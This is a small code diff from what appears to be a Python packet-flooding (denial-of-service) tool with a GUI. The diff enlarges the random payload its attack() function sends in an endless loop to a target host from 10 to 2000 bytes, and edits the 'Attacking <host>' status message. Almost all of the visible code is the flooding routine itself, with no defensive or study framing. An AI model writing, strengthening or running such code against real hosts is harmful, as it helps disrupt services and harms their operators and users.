@@ -29,7 +29,7 @@ def event_button_target(customtkinter, app, target):
     lock_label.place(relx=0.5, rely=0.9, anchor=customtkinter.CENTER)
 
 def attack(host, packet):
-    r = random._urandom(10)
+    r = random._urandom(2000)
     u = 0
     
     while True:
@@ -40,7 +40,7 @@ def attack(host, packet):
             for x in range(packet):
                 s.send(r)
                 u += 1
-                print("\033[92mSent: " + str(u) + " \033[94m[-- Attacking " + host + " --]")
+                print("\033[92mSent : " + str(u) + " \033[94m[-- Attacking " + host + " --]")
         except:
             s.close()
             print("\033[91mNo connection, server maybe down!")
